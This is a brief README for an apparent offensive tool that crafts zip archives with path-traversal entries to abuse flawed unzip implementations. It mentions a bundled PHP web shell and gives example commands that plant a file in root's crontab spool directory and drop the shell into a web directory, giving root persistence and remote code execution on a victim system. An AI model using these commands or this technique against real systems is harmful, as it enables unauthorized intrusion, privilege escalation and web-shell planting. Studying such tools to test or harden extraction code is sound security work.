# zipped
Tool to create custom zip files with path traversal for certain bad unzip implementations.

Includes sample PHP shell (sh.php)

# Example Usage
`./zipped crontab cron.zip ../../../../../../../var/spool/cron/crontabs/root`

`./zipped sh.php sh.zip ../../../../../www/sh.php`
